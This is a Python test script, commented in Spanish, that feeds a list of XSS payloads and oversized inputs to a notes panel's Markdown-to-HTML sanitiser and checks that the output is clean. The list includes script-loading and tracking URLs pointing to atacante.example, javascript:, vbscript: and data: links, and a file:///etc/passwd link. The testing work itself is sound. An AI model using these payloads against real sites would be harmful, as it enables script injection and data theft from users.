"""Notas maliciosas contra el saneado real. Se ejecuta como panel, desde backend/."""
import html.parser
import sys
import time

import notas

# 2,1 s sin carga en WSL2 y hasta 3,2 s con la bateria en marcha. Lo que busca es un disparo, no medir.
MAX_S = 5.0
PERMITIDOS = {"a": {"href", "rel"}}
CARGAS = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=http://atacante.example/x.js></SCRIPT>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)><circle/></svg>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
    "<iframe src=http://atacante.example></iframe>",
    "<object data=http://atacante.example></object>",
    "<embed src=http://atacante.example>",
    "<form action=http://atacante.example><input name=frase autofocus onfocus=alert(1)></form>",
    "<button formaction=javascript:alert(1)>x</button>",
    "<style>@import url(http://atacante.example/a.css);</style>",
    "<link rel=stylesheet href=http://atacante.example/a.css>",
    "<meta http-equiv=refresh content='0;url=http://atacante.example'>",
    "<base href=http://atacante.example/>",
    "<details open ontoggle=alert(1)>x</details>",
    "<a href=https://ejemplo.org style='position:fixed;inset:0' onclick=alert(1)>x</a>",
    "<div class=revision-pie style=position:fixed>Boton falso</div>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<table><td background=javascript:alert(1)>x</td></table>",
    "<!-- <img src=x onerror=alert(1)> -->",
    "<![CDATA[<img src=x onerror=alert(1)>]]>",
    "[a](javascript:alert(1))",
    "[a](JaVaScRiPt:alert(1))",
    "[a](java&#115;cript:alert(1))",
    "[a](java&#x0A;script:alert(1))",
    "[a](javascript&colon;alert(1))",
    "[a](java%0ascript:alert(1))",
    "[a](<javascript:alert(1)>)",
    "[a](\tjavascript:alert(1))",
    "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    "[a](vbscript:msgbox(1))",
    "[a](file:///etc/passwd)",
    "[a](//atacante.example/x)",
    "[a](/api/estado)",
    "[a](#ancla)",
    "[a](ftp://atacante.example/x)",
    "<javascript:alert(1)>",
    "[r][1]\n\n[1]: javascript:alert(1)",
    "[a](https://ejemplo.org \"\\\"onmouseover=alert(1) x=\\\"\")",
    "![x](http://atacante.example/espia.png)",
    "![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)",
    "| a |\n|---|\n| <img src=x onerror=alert(1)> |",
    "`<script>alert(1)</script>`",
    "```html\n<script>alert(1)</script>\n```",
    "---\ntitulo: <script>alert(1)</script>\n---\n# <img src=x onerror=alert(1)>",
    "‮<img src=x onerror=alert(1)>‬",
]
ENORMES = {
    # Del tamano maximo que el panel acepta abrir.
    "citas anidadas": ">" * notas.MAX_NOTA,
    "listas anidadas": "\n".join(" " * i + "- x" for i in range(0, 1400)),
    "corchetes": "[" * notas.MAX_NOTA,
    "enlaces sin cerrar": "[a](" * (notas.MAX_NOTA // 4),
    "asteriscos": "*a" * (notas.MAX_NOTA // 2),
    "entidades": "&amp;" * (notas.MAX_NOTA // 5),
    "tabla ancha": "|" + "a|" * (notas.MAX_NOTA // 4) + "\n|" + "-|" * (notas.MAX_NOTA // 4),
    "codigo sin cerrar": "`" * notas.MAX_NOTA,
}


class Revisor(html.parser.HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.problemas = []

    def handle_starttag(self, tag, attrs):
        if tag not in notas.ETIQUETAS:
            self.problemas.append(f"etiqueta {tag}")
        for nombre, valor in attrs:
            if nombre not in PERMITIDOS.get(tag, set()):
                self.problemas.append(f"atributo {tag}.{nombre}")
            if nombre == "href" and not (valor or "").startswith(("http://", "https://")):
                self.problemas.append(f"href {valor!r}")


def main():
    fallos = 0
    for carga in CARGAS:
        r = Revisor()
        r.feed(notas.a_html(carga))
        r.close()
        if r.problemas:
            fallos += 1
            print(f"  [FALLO] nota {carga[:60]!r}: {r.problemas}")
    if not fallos:
        print(f"  [ OK ]  {len(CARGAS)} notas maliciosas quedan saneadas")
    if notas.MAX_NOTA > 256 * 1024:
        fallos += 1
        print("  [FALLO] el limite de tamano de las notas es demasiado alto")
    if notas.html_de.__wrapped__ is None:
        fallos += 1
    if "https://ejemplo.org" not in notas.a_html("[a](https://ejemplo.org)"):
        fallos += 1
        print("  [FALLO] un enlace normal se pierde")
    for nombre, texto in ENORMES.items():
        inicio = time.monotonic()
        try:
            notas.a_html(texto)
            problema = None
        except Exception as e:  # noqa: BLE001  Una nota no debe poder romper el panel.
            problema = repr(e)[:100]
        s = time.monotonic() - inicio
        if problema or s > MAX_S:
            fallos += 1
            print(f"  [FALLO] nota enorme ({nombre}): {s:.1f} s {problema or ''}")
        else:
            print(f"  [ OK ]  nota enorme ({nombre}): {s:.2f} s")
    return fallos


if __name__ == "__main__":
    sys.exit(min(main(), 100))
